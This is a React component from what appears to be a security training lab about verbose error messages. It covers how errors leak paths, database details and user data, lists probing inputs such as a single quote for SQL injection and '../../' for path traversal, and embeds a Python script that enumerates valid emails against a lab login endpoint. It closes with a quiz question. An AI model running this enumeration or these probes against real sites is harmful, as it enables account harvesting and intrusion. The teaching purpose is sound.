import { useState, useEffect } from "react";
import { fetchProgress, submitAnswer } from "@/api/fetchProgress";

const VerboseErrors = ({ userId }: { userId: string }) => {
  const [answer, setAnswer] = useState("");
  const [feedback, setFeedback] = useState<string | null>(null);
  const [completed, setCompleted] = useState(false);
  const [buttonColor, setButtonColor] = useState("bg-blue-500 hover:bg-blue-700");

  useEffect(() => {
    fetchProgress(userId).then((progress) => {
      if (progress["VerboseErrors"]?.completed) {
        setCompleted(true);
        setButtonColor("bg-green-500");
      }
    });
  }, [userId]);

  const handleSubmit = async () => {
    const result = await submitAnswer(userId, "VerboseErrors", answer);
    if (result.correct) {
      setCompleted(true);
      setButtonColor("bg-green-500");
      setFeedback(null);
    } else {
      setButtonColor("bg-red-500 hover:bg-red-700");
      setFeedback("❌ Incorrect answer! Try again.");
      setTimeout(() => setButtonColor("bg-blue-500 hover:bg-blue-700"), 2000);
    }
  };

  return (
    <div className="p-6 bg-gray-900 text-white rounded-md">
      {/* Title */}
      <h2 className="text-2xl font-bold mb-4">Understanding Verbose Errors</h2>

      {/* Description */}
      <p className="mb-4">
        Imagine you're a detective with a knack for spotting clues that others might overlook. In web development,
        verbose errors are like unintentional whispers of a system, revealing secrets meant to be kept hidden.
        These detailed error messages help developers debug issues, but they can also expose sensitive data to attackers.
      </p>

      {/* Information Leaks */}
      <h3 className="text-xl font-semibold mb-2">Verbose Errors Can Leak Information</h3>
      <ul className="list-disc pl-6 space-y-2 mb-4">
        <li><strong>Internal Paths:</strong> Reveals file paths and directory structures of the server.</li>
        <li><strong>Database Details:</strong> Exposes database names, table structures, or error responses.</li>
        <li><strong>User Information:</strong> Can reveal usernames or personal details during login attempts.</li>
      </ul>

      {/* Inducing Errors */}
      <h3 className="text-xl font-semibold mb-2">Inducing Verbose Errors</h3>
      <p className="mb-4">Attackers provoke verbose errors using various techniques, such as:</p>
      <ul className="list-disc pl-6 space-y-2 mb-4">
        <li><strong>Invalid Login Attempts:</strong> Different messages reveal valid accounts.</li>
        <li><strong>SQL Injection:</strong> Entering a single quote (`'`) might cause schema-revealing errors.</li>
        <li><strong>File Inclusion/Traversal:</strong> Inputs like `../../` might disclose internal file paths.</li>
        <li><strong>Form Manipulation:</strong> Altering parameters can trigger debug responses.</li>
        <li><strong>Application Fuzzing:</strong> Tools like Burp Suite send payloads to trigger errors.</li>
      </ul>

      {/* Python Automation */}
      <h3 className="text-xl font-semibold mb-2">Automation with Python</h3>
      <p className="mb-4">
        Below is a Python script to check for valid emails on a vulnerable web app:
      </p>

      <div className="bg-gray-800 p-4 rounded-md mb-4 overflow-x-auto">
        <pre className="text-green-300 text-sm">
          {`import requests
import sys

def check_email(email):
    url = 'http://enum.thm/labs/verbose_login/functions.php'
    headers = {'User-Agent': 'Mozilla/5.0'}
    data = {'username': email, 'password': 'password', 'function': 'login'}

    response = requests.post(url, headers=headers, data=data)
    return response.json()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)

    email_file = sys.argv[1]
    with open(email_file, 'r') as file:
        emails = file.readlines()

    for email in emails:
        response = check_email(email.strip())
        if "Email does not exist" in response['message']:
            print(f"[INVALID] {email.strip()}")
        else:
            print(f"[VALID] {email.strip()}")`}
        </pre>
      </div>

      <p className="mb-4">
        The script checks an email list against the web app, filtering valid and invalid ones based on error messages.
      </p>

      {/* Answer the Question Section */}
      <h3 className="text-xl font-semibold mb-2">Answer the Question</h3>
      <p className="mb-4">What internal filename was revealed in the verbose error?</p>

      <div className="flex items-center space-x-2">
        <input
          type="text"
          value={answer}
          onChange={(e) => setAnswer(e.target.value)}
          className="flex-1 p-2 bg-gray-700 text-white rounded-md border border-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500"
          placeholder="Enter your answer here"
        />
        <button
          onClick={handleSubmit}
          className={`p-2 px-4 rounded-md font-bold text-white transition-all ${buttonColor}`}
        >
          Submit
        </button>
      </div>

      {feedback && <p className="mt-2 text-red-400">{feedback}</p>}
      {completed && <p className="mt-4 text-green-400 font-bold">✅ Task Completed!</p>}
    </div>
  );
};

export default VerboseErrors;
